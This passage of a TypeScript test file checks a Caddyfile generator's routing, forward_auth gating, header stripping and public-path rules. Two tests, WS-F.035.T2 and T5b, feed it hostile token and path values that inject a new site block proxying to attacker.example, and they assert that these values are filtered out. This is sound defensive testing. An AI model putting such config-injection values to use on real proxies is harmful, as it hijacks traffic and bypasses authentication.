		expect(out).toContain('handle @liv_api_subresource {')
		// Locate the @liv_api_subresource block and verify it contains
		// `path /api/*` but NOT a path token referencing /ws.
		const apiIdx = out.indexOf('@liv_api_subresource {')
		const apiBlockClose = out.indexOf('\t}', apiIdx)
		expect(apiBlockClose).toBeGreaterThan(apiIdx)
		const apiMatcherBlock = out.slice(apiIdx, apiBlockClose)
		expect(apiMatcherBlock).toContain('path /api/*')
		// Crucial: the matcher MUST NOT route /ws — that's @liv_ws's job.
		expect(apiMatcherBlock).not.toContain('/ws')
	})

	it('apex @liv_api_subresource handle reverse-proxies to 127.0.0.1:3020 + strips XFO/CSP + sets frame-ancestors CSP', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const idx = out.indexOf('handle @liv_api_subresource {')
		expect(idx).toBeGreaterThan(-1)
		const blockTail = out.slice(idx, idx + 600)
		expect(blockTail).toContain('reverse_proxy 127.0.0.1:3020')
		expect(blockTail).toContain('header_down -X-Frame-Options')
		expect(blockTail).toContain('header_down -Content-Security-Policy')
		expect(blockTail).toContain(
			"header Content-Security-Policy \"frame-ancestors 'self' https://bruce.livinity.io\"",
		)
	})

	it('OLD Phase 236 `@liv_subresource` combined matcher is GONE (no /api/* /ws /ws/* token list)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		// The old combined matcher used `@liv_subresource` and the path token
		// list `/api/* /ws /ws/*`. Both must be absent post-237.
		expect(out).not.toContain('@liv_subresource')
		expect(out).not.toContain('path /api/* /ws /ws/*')
	})

	it('apex block — @liv_ws + @liv_api_subresource emit BEFORE @liv path (source ordering)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const apexStart = out.indexOf('bruce.livinity.io {')
		expect(apexStart).toBeGreaterThan(-1)
		const wsIdx = out.indexOf('@liv_ws path /ws /ws/*', apexStart)
		const apiIdx = out.indexOf('@liv_api_subresource {', apexStart)
		const livIdx = out.indexOf('@liv path /liv /liv/*', apexStart)
		expect(wsIdx).toBeGreaterThan(apexStart)
		expect(apiIdx).toBeGreaterThan(wsIdx) // @liv_ws first, then @liv_api_subresource
		expect(livIdx).toBeGreaterThan(apiIdx) // both before @liv
	})

	it('apex @liv_ws + @liv_api_subresource handles appear BEFORE the catch-all :8080 handle', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const apexStart = out.indexOf('bruce.livinity.io {')
		const wsHandleIdx = out.indexOf('handle @liv_ws {', apexStart)
		const apiHandleIdx = out.indexOf('handle @liv_api_subresource {', apexStart)
		const catchAllIdx = out.indexOf(
			'\thandle {\n\t\treverse_proxy 127.0.0.1:8080',
			apexStart,
		)
		expect(wsHandleIdx).toBeGreaterThan(-1)
		expect(apiHandleIdx).toBeGreaterThan(-1)
		expect(catchAllIdx).toBeGreaterThan(-1)
		expect(wsHandleIdx).toBeLessThan(catchAllIdx)
		expect(apiHandleIdx).toBeLessThan(catchAllIdx)
	})

	it('null mainDomain :80 fallback block emits BOTH matchers', () => {
		const out = generateFullCaddyfile({mainDomain: null, subdomains: []}, false, false, [])
		expect(out).toContain('@liv_ws path /ws /ws/*')
		expect(out).toContain('handle @liv_ws {')
		expect(out).toContain('@liv_api_subresource {')
		expect(out).toContain('header_regexp Referer ^https?://[^/]+/liv(/|$)')
	})

	it('multi-user subdomain block emits BOTH matchers (per-user iframe access)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'livinity.io',
				subdomains: [{subdomain: 'bruce', appId: 'gw', port: 8080, enabled: true}],
			},
			true,
			false,
			[],
		)
		const subBlockStart = out.indexOf('bruce.livinity.io {')
		expect(subBlockStart).toBeGreaterThan(-1)
		const wsIdx = out.indexOf('@liv_ws path /ws /ws/*', subBlockStart)
		const apiIdx = out.indexOf('@liv_api_subresource {', subBlockStart)
		const livIdx = out.indexOf('@liv path /liv /liv/*', subBlockStart)
		expect(wsIdx).toBeGreaterThan(subBlockStart)
		expect(apiIdx).toBeGreaterThan(wsIdx)
		expect(livIdx).toBeGreaterThan(apiIdx)
	})

	it('tunnel-mode apex block keeps http:// prefix AND emits both matchers', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			true,
			[],
		)
		expect(out).toContain('http://bruce.livinity.io {')
		const apexStart = out.indexOf('http://bruce.livinity.io {')
		expect(out.indexOf('@liv_ws path /ws /ws/*', apexStart)).toBeGreaterThan(apexStart)
		expect(out.indexOf('@liv_api_subresource {', apexStart)).toBeGreaterThan(apexStart)
	})

	it('neither matcher emits header_up Connection / Upgrade (preserves Caddy WS auto-upgrade)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		// Slice from @liv_ws through the closing of @liv_api_subresource (before
		// the @liv path matcher takes over).
		const wsIdx = out.indexOf('@liv_ws path /ws /ws/*')
		const livIdx = out.indexOf('@liv path /liv /liv/*', wsIdx)
		const combinedBlock = out.slice(wsIdx, livIdx)
		expect(combinedBlock).not.toContain('header_up Connection')
		expect(combinedBlock).not.toContain('header_up Upgrade')
	})

	it('Phase 226-04 invariants STILL hold post-237: @liv → :3020 + XFO/CSP strip + frame-ancestors CSP', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain('@liv path /liv /liv/*')
		expect(out).toContain('handle @liv {')
		expect(out).toContain('uri strip_prefix /liv')
		// Now THREE :3020 reverse_proxies exist per site block: @liv_ws + @liv_api_subresource + @liv
		// (apex block alone contributes 3; this assertion is conservative.)
		const reverseProxyMatches = out.match(/reverse_proxy 127\.0\.0\.1:3020/g) || []
		expect(reverseProxyMatches.length).toBeGreaterThanOrEqual(3)
	})

	it('@liv_ws + @liv_api_subresource emit in 2+ site blocks for multi-user + apex config', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'livinity.io',
				subdomains: [{subdomain: 'bruce', appId: 'gw', port: 8080, enabled: true}],
			},
			true,
			false,
			[],
		)
		const wsMatches = out.match(/@liv_ws path \/ws \/ws\/\*/g) || []
		const apiMatches = out.match(/@liv_api_subresource \{/g) || []
		expect(wsMatches.length).toBeGreaterThanOrEqual(2)
		expect(apiMatches.length).toBeGreaterThanOrEqual(2)
	})
})

// ─── Phase 243-02 — @livos_terminal_ws (persistent UI terminal endpoint) ───
//
// Mirrors Phase 237 @liv_ws pattern but with two divergences:
//   1. Reverse-proxies to livinityd :8080 (NOT AionUi :3020).
//   2. Path is fixed at /livos/terminal/ws (single, unconditional).
//
// L-243-C requires the matcher to be unconditional (no Referer regex)
// because RFC 6455 forbids browsers from sending Referer on the WS
// upgrade handshake — Phase 237 already learned this lesson with
// @liv_subresource.
describe('Phase 243-02 — @livos_terminal_ws matcher (L-243-C unconditional + L-243-D backend)', () => {
	it('apex block emits @livos_terminal_ws path matcher with /livos/terminal/ws token (exactly once per site block)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		expect(out).toContain('@livos_terminal_ws path /livos/terminal/ws')
		expect(out).toContain('handle @livos_terminal_ws {')
		// Exactly one matcher declaration per site block (apex-only here).
		const matcherMatches = out.match(/@livos_terminal_ws path \/livos\/terminal\/ws/g) || []
		expect(matcherMatches.length).toBe(1)
	})

	it('@livos_terminal_ws handle reverse-proxies to 127.0.0.1:8080 (livinityd, NOT :3020 AionUi)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const idx = out.indexOf('handle @livos_terminal_ws {')
		expect(idx).toBeGreaterThan(-1)
		// Slice ends at the next matcher declaration (@liv) — the next handle
		// in the apex block. This keeps the assertion scoped to ONLY the
		// @livos_terminal_ws handle body.
		const nextMatcherIdx = out.indexOf('@liv path /liv', idx)
		expect(nextMatcherIdx).toBeGreaterThan(idx)
		const slice = out.slice(idx, nextMatcherIdx)
		expect(slice).toContain('reverse_proxy 127.0.0.1:8080')
		// MUST NOT route to AionUi (port 3020) — that would be a wrong-backend regression.
		expect(slice).not.toContain('reverse_proxy 127.0.0.1:3020')
	})

	it('@livos_terminal_ws matcher emits BEFORE the catch-all :8080 handle in the apex block', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const apexStart = out.indexOf('bruce.livinity.io {')
		expect(apexStart).toBeGreaterThan(-1)
		const matcherIdx = out.indexOf('@livos_terminal_ws path /livos/terminal/ws', apexStart)
		expect(matcherIdx).toBeGreaterThan(apexStart)
		// Catch-all is `handle {` (no matcher) — must be AFTER the new matcher.
		const catchAllIdx = out.indexOf('\thandle {', matcherIdx)
		expect(catchAllIdx).toBeGreaterThan(matcherIdx)
	})

	it('@livos_terminal_ws block does NOT contain header_regexp Referer (L-243-C unconditional contract)', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[],
		)
		const matcherIdx = out.indexOf('@livos_terminal_ws path /livos/terminal/ws')
		expect(matcherIdx).toBeGreaterThan(-1)
		// Slice through the handle body — stop at the closing `\t}` end-of-handle.
		const handleIdx = out.indexOf('handle @livos_terminal_ws {', matcherIdx)
		const endIdx = out.indexOf('\t}', handleIdx)
		const slice = out.slice(matcherIdx, endIdx)
		expect(slice).not.toContain('header_regexp')
		expect(slice).not.toContain('Referer')
	})

	it('@livos_terminal_ws emits in apex + multi-user wildcard subdomain blocks (≥2 emits)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'livinity.io',
				subdomains: [{subdomain: 'bruce', appId: 'gw', port: 8080, enabled: true}],
			},
			true,
			false,
			[],
		)
		const matches = out.match(/@livos_terminal_ws path \/livos\/terminal\/ws/g) || []
		expect(matches.length).toBeGreaterThanOrEqual(2)
		// Both must point at :8080 (livinityd) — count handle declarations too.
		const handleMatches = out.match(/handle @livos_terminal_ws \{/g) || []
		expect(handleMatches.length).toBeGreaterThanOrEqual(2)
	})
})

// ─── Phase 256-04 WS-D — forward_auth JWT gate for subdomains (LIVOS-008) ────
describe('generateFullCaddyfile — Phase 256-04 LIVOS-008 forward_auth gate', () => {
	test('WS-D.T1 — single-user installed-app block uses forward_auth, not presence glob', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [{subdomain: 'n8n', appId: 'n8n', port: 9001, enabled: true}],
			},
			false, // single-user — the vulnerable path
			false,
			[],
		)
		// The installed-app block must validate the JWT via forward_auth → /auth/verify
		expect(out).toContain('forward_auth')
		expect(out).toContain('/auth/verify')
		expect(out).toContain('127.0.0.1:8080')
		// The presence-only glob must be GONE.
		expect(out).not.toContain('header Cookie *LIVINITY_SESSION=*')
		// The container is still the upstream after a positive auth decision.
		expect(out).toContain('reverse_proxy 127.0.0.1:9001')
	})

	test('WS-D.T2 — native-app block uses forward_auth', () => {
		const out = generateFullCaddyfile(
			{mainDomain: 'bruce.livinity.io', subdomains: []},
			false,
			false,
			[{subdomain: 'opendesign', port: 9100}],
		)
		expect(out).toContain('forward_auth')
		expect(out).toContain('/auth/verify')
		expect(out).not.toContain('header Cookie *LIVINITY_SESSION=*')
		expect(out).toContain('reverse_proxy 127.0.0.1:9100')
	})

	test('WS-D.T3 — on a 401 the gate still redirects to /login', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [{subdomain: 'n8n', appId: 'n8n', port: 9001, enabled: true}],
			},
			false,
			false,
			[{subdomain: 'opendesign', port: 9100}],
		)
		// Phase 259 — the 401 now bounces through the apex SSO handshake (which
		// itself falls through to /login when the operator is genuinely logged out).
		expect(out).toContain('redir https://bruce.livinity.io/__livos_sso?return=')
		// Caddy needs to react to the upstream auth verdict.
		expect(out).toMatch(/handle_response|@(bad|unauth)/)
	})

	test('WS-D.T4 — OpenDesign upstreamBearer block preserved (runs post-auth)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [
					{
						subdomain: 'open-design',
						appId: 'od',
						port: 9200,
						enabled: true,
						upstreamBearer: 'OD_SECRET_TOKEN',
					},
				],
			},
			false,
			false,
			[],
		)
		expect(out).toContain('forward_auth')
		expect(out).toContain('header_up Authorization "Bearer OD_SECRET_TOKEN"')
		expect(out).toContain('header_up Host 127.0.0.1:9200')
	})

	test('WS-D.T5 — multi-user wildcard block unchanged (still :8080 reverse_proxy, no forward_auth gate added)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [{subdomain: 'n8n', appId: 'n8n', port: 9001, enabled: true}],
			},
			true, // multi-user — validated by livinityd :8080 already
			false,
			[],
		)
		expect(out).toContain('reverse_proxy 127.0.0.1:8080')
	})
})

// ─── Phase 257-06 WS-F — upstreamBearer charset validation (LIVOS-035) ───────
describe('generateFullCaddyfile — Phase 257-06 LIVOS-035 upstreamBearer charset gate', () => {
	test('WS-F.035.T1 — a clean token is emitted as the Bearer header', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [
					{
						subdomain: 'open-design',
						appId: 'od',
						port: 9200,
						enabled: true,
						upstreamBearer: 'abc.DEF-123_xyz',
					},
				],
			},
			false,
			false,
			[],
		)
		expect(out).toContain('header_up Authorization "Bearer abc.DEF-123_xyz"')
		expect(out).toContain('header_up Host 127.0.0.1:9200')
	})

	test('WS-F.035.T2 — an injection token (quote/newline/brace/dollar-brace) is NOT emitted', () => {
		const hostile = 'foo"\n}\n:80 {\nreverse_proxy http://attacker.example\n}'
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [
					{
						subdomain: 'open-design',
						appId: 'od',
						port: 9200,
						enabled: true,
						upstreamBearer: hostile,
					},
				],
			},
			false,
			false,
			[],
		)
		// The malicious string must never reach the Caddyfile — bearer line omitted.
		expect(out).not.toContain('attacker.example')
		expect(out).not.toContain('Bearer foo')
		expect(out).not.toContain('header_up Authorization')
		// The block itself still emits (forward_auth + reverse_proxy), just without the bearer.
		expect(out).toContain('reverse_proxy 127.0.0.1:9200')
	})

	test('WS-F.035.T3 — 256-04 forward_auth blocks preserved (no regression)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: 'bruce.livinity.io',
				subdomains: [
					{
						subdomain: 'open-design',
						appId: 'od',
						port: 9200,
						enabled: true,
						upstreamBearer: 'OD_SECRET_TOKEN',
					},
				],
			},
			false,
			false,
			[],
		)
		expect(out).toContain('forward_auth')
		expect(out).toContain('header_up Authorization "Bearer OD_SECRET_TOKEN"')
	})
})

// ─── Phase 258-02 WS-B — public-access carve-out (the security spine) ─────────
// Helper: slice the single-user subdomain block (fullDomain { … }) out of the
// full Caddyfile by counting braces from the block header.
function sliceSubdomainBlock(out: string, fullDomain: string): string {
	const start = out.indexOf(`${fullDomain} {`)
	if (start === -1) throw new Error(`block for ${fullDomain} not found`)
	let depth = 0
	let i = start
	for (; i < out.length; i++) {
		if (out[i] === '{') depth++
		else if (out[i] === '}') {
			depth--
			if (depth === 0) {
				i++
				break
			}
		}
	}
	return out.slice(start, i)
}

describe('generateFullCaddyfile — Phase 258-02 WS-B public-access carve-out', () => {
	const baseDomain = 'bruce.livinity.io'

	// ── Task 1: paths-mode + multi-user hardening ──
	test('T1 — paths mode emits one public handle per prefix BEFORE the gated catch-all', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'cal',
						appId: 'calcom',
						port: 9300,
						enabled: true,
						publicAccess: {mode: 'paths', paths: ['/booking/', '/d/'], hasOwnAuth: false},
					},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `cal.${baseDomain}`)
		// each public prefix gets a handle + reverse_proxy to the container
		expect(block).toContain('handle /booking/* {')
		expect(block).toContain('handle /d/* {')
		expect(block).toContain('reverse_proxy 127.0.0.1:9300')
		// the gated catch-all is preserved and appears AFTER both public handles
		const bookingIdx = block.indexOf('handle /booking/* {')
		const dIdx = block.indexOf('handle /d/* {')
		const gateIdx = block.indexOf('forward_auth')
		expect(bookingIdx).toBeGreaterThan(-1)
		expect(dIdx).toBeGreaterThan(-1)
		expect(gateIdx).toBeGreaterThan(bookingIdx)
		expect(gateIdx).toBeGreaterThan(dIdx)
	})

	test('T2 — every public block strips Remote-User / Remote-Role / X-Daemon-Bearer', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'cal',
						appId: 'calcom',
						port: 9300,
						enabled: true,
						publicAccess: {mode: 'paths', paths: ['/booking/', '/d/'], hasOwnAuth: false},
					},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `cal.${baseDomain}`)
		// extract each public handle slice and assert the strip trio in EACH
		for (const prefix of ['/booking/*', '/d/*']) {
			const hStart = block.indexOf(`handle ${prefix} {`)
			const hSlice = block.slice(hStart, block.indexOf('}', hStart + prefix.length))
			expect(hSlice).toContain('request_header -Remote-User')
			expect(hSlice).toContain('request_header -Remote-Role')
			expect(hSlice).toContain('request_header -X-Daemon-Bearer')
		}
	})

	test('T3 — gated catch-all preserved for paths mode (forward_auth + /auth/verify + redir)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'cal',
						appId: 'calcom',
						port: 9300,
						enabled: true,
						publicAccess: {mode: 'paths', paths: ['/booking/'], hasOwnAuth: false},
					},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `cal.${baseDomain}`)
		expect(block).toContain('forward_auth 127.0.0.1:8080')
		expect(block).toContain('uri /auth/verify')
		expect(block).toContain('copy_headers Cookie')
		expect(block).toContain(`redir https://${baseDomain}/__livos_sso?return=`)
		expect(block).toContain('reverse_proxy 127.0.0.1:9300')
	})

	test('T4 — daemon bearer is GATED-ONLY, never in a public handle block', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'cal',
						appId: 'calcom',
						port: 9300,
						enabled: true,
						upstreamBearer: 'OD_SECRET_TOKEN',
						publicAccess: {mode: 'paths', paths: ['/booking/'], hasOwnAuth: false},
					},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `cal.${baseDomain}`)
		// bearer present (gated path runs) but ONLY after the forward_auth gate
		const bearerIdx = block.indexOf('header_up Authorization')
		const gateIdx = block.indexOf('forward_auth')
		expect(bearerIdx).toBeGreaterThan(-1)
		expect(gateIdx).toBeGreaterThan(-1)
		expect(bearerIdx).toBeGreaterThan(gateIdx)
		// the public handle slice must NOT contain the bearer
		const hStart = block.indexOf('handle /booking/* {')
		const hSlice = block.slice(hStart, block.indexOf('forward_auth'))
		expect(hSlice).not.toContain('header_up Authorization')
		expect(hSlice).toContain('handle /booking/* {')
	})

	test('T5 — public handles emit BEFORE the gated handle (first-match ordering)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'cal',
						appId: 'calcom',
						port: 9300,
						enabled: true,
						publicAccess: {mode: 'paths', paths: ['/booking/'], hasOwnAuth: false},
					},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `cal.${baseDomain}`)
		const publicIdx = block.indexOf('handle /booking/* {')
		// the gated catch-all has no matcher: `\thandle {` (one tab, then `handle {`)
		const gatedHandleIdx = block.indexOf('\thandle {')
		expect(publicIdx).toBeGreaterThan(-1)
		expect(gatedHandleIdx).toBeGreaterThan(-1)
		expect(publicIdx).toBeLessThan(gatedHandleIdx)
	})

	test('T5b — hostile path prefix (brace/quote/whitespace) is skipped, never interpolated', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'cal',
						appId: 'calcom',
						port: 9300,
						enabled: true,
						publicAccess: {
							mode: 'paths',
							paths: ['/booking/', '/x"\n}\n:80 {\nreverse_proxy http://attacker.example\n}'],
							hasOwnAuth: false,
						},
					},
				],
			},
			false,
			false,
			[],
		)
		expect(out).not.toContain('attacker.example')
		// the clean prefix still emits
		expect(out).toContain('handle /booking/* {')
	})

	test('T6 — NOTE-1: multi-user app block ALSO strips the three identity headers', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [{subdomain: 'n8n', appId: 'n8n', port: 9001, enabled: true}],
			},
			true, // multi-user
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `n8n.${baseDomain}`)
		expect(block).toContain('reverse_proxy 127.0.0.1:8080')
		expect(block).toContain('request_header -Remote-User')
		expect(block).toContain('request_header -Remote-Role')
		expect(block).toContain('request_header -X-Daemon-Bearer')
	})

	// ── Task 2: whole-app mode + SC5 byte-equivalence ──
	test('WA1 — whole-app: single reverse_proxy, NO forward_auth, strip present', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'app',
						appId: 'someapp',
						port: 9400,
						enabled: true,
						publicAccess: {mode: 'whole-app', paths: [], hasOwnAuth: true},
					},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `app.${baseDomain}`)
		expect(block).toContain('reverse_proxy 127.0.0.1:9400')
		expect(block).not.toContain('forward_auth')
		expect(block).not.toContain('/auth/verify')
		expect(block).toContain('request_header -Remote-User')
		expect(block).toContain('request_header -Remote-Role')
		expect(block).toContain('request_header -X-Daemon-Bearer')
	})

	test('WA2 — whole-app never bears the daemon token (bearer is gated-only)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{
						subdomain: 'app',
						appId: 'someapp',
						port: 9400,
						enabled: true,
						upstreamBearer: 'OD_SECRET_TOKEN',
						publicAccess: {mode: 'whole-app', paths: [], hasOwnAuth: true},
					},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `app.${baseDomain}`)
		expect(block).not.toContain('header_up Authorization')
		expect(block).not.toContain('OD_SECRET_TOKEN')
	})

	// SC5 — byte-equivalence: a non-public single-user app block is CHARACTER-
	// identical to the pre-258 256-04 emit, with AND without the 257-06 bearer.
	function expectedGatedBlock(domain: string, port: number, bearer?: string): string {
		const bearerLines = bearer
			? `\t\theader_up Authorization "Bearer ${bearer}"\n\t\theader_up Host 127.0.0.1:${port}\n\t\theader_up Origin http://127.0.0.1:${port}\n`
			: ''
		// Phase 259 — mirrors the production emit (caddy.ts): the ungated
		// /__livos_auth SSO-landing carve-out FIRST, then the gated catch-all
		// wrapped in `handle {}`, with the 401 redirect now pointing at the apex
		// /__livos_sso bounce instead of straight to /login.
		const ssoAuthHandle = `\thandle /__livos_auth* {
\t\trequest_header -Remote-User
\t\trequest_header -Remote-Role
\t\trequest_header -X-Daemon-Bearer
\t\treverse_proxy 127.0.0.1:8080 {
\t\tflush_interval -1
\t\ttransport http {
\t\t\tversions 1.1
\t\t}
\t\t}
\t}`
		const gatedHandleBody = `\tforward_auth 127.0.0.1:8080 {
\t\turi /auth/verify
\t\tcopy_headers Cookie
\t\t@bad status 401
\t\thandle_response @bad {
\t\t\tredir https://${baseDomain}/__livos_sso?return={scheme}://{host}{uri}
\t\t}
\t}
\treverse_proxy 127.0.0.1:${port} {
${bearerLines}\t\tflush_interval -1
\t\ttransport http {
\t\t\tversions 1.1
\t\t}
\t}`
		return `${domain} {
${ssoAuthHandle}
\thandle {
${gatedHandleBody.replace(/^\t/gm, '\t\t')}
\t}
}`
	}

	test('SC5 — no publicAccess single-user block is byte-identical to 256-04 (no bearer)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [{subdomain: 'n8n', appId: 'n8n', port: 9001, enabled: true}],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `n8n.${baseDomain}`)
		expect(block).toBe(expectedGatedBlock(`n8n.${baseDomain}`, 9001))
	})

	test('SC5 — no publicAccess single-user block byte-identical WITH bearer (257-06 path)', () => {
		const out = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{subdomain: 'od', appId: 'od', port: 9200, enabled: true, upstreamBearer: 'OD_SECRET_TOKEN'},
				],
			},
			false,
			false,
			[],
		)
		const block = sliceSubdomainBlock(out, `od.${baseDomain}`)
		expect(block).toBe(expectedGatedBlock(`od.${baseDomain}`, 9200, 'OD_SECRET_TOKEN'))
	})

	test("SC5 — mode 'none' produces byte-identical output to no publicAccess", () => {
		const withNone = generateFullCaddyfile(
			{
				mainDomain: baseDomain,
				subdomains: [
					{subdomain: 'n8n', appId: 'n8n', port: 9001, enabled: true, publicAccess: {mode: 'none', paths: [], hasOwnAuth: false}},
				],
			},
			false,
			false,
			[],
		)
		const blockNone = sliceSubdomainBlock(withNone, `n8n.${baseDomain}`)
		expect(blockNone).toBe(expectedGatedBlock(`n8n.${baseDomain}`, 9001))
	})
})
